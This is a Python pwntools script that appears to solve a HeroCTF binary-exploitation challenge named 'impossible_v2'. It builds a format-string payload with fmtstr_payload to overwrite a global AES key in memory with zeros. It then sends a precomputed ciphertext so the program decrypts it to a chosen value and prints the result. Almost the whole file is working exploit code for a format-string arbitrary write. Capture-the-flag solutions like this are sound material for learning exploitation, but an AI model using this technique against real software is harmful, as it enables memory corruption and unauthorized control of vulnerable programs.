from pwn import *

elf = context.binary = ELF("./impossible_v2")

# r = remote("static-03.heroctf.fr", 5001)
r = elf.process()

key_addr = elf.sym['key']
log.success(f"Key address: {hex(key_addr)}")

# If we control the key, we can send decrypt(deadbeefdeadbeefcafebabecafebabe) as a message

# In [1]: cipher = AES.new(bytes.fromhex('00000000000000000000000000000000'), AES.MODE_ECB)
# In [2]: cipher.decrypt(bytes.fromhex('deadbeefdeadbeefcafebabecafebabe')).hex()
# Out[2]: '4daa646aa2b5e32d1076a9e6bfa5e2ba'

writes = {
    key_addr:       0x0,
    key_addr + 8:   0x0
}

# offset 9: AAAAAAAA-%9$p --> AAAAAAAA-0x4141414141414141
# For some reason, fmtstr_payload will produce a payload like "%11$lln%12$lln" with offset=9
# --> let's use offset=7
payload = fmtstr_payload(7, writes)

log.success(f"Payload length: {len(payload)}")
log.success(f"Payload: {payload}")

r.sendlineafter(b"Enter your message: ", payload)

r.sendlineafter(b"Do you want to change it ? (y/n) ", b"y")

message = bytes.fromhex("4daa646aa2b5e32d1076a9e6bfa5e2ba")
r.sendlineafter(b"Enter your message (last chance): ", message)

print(r.recvall().decode())
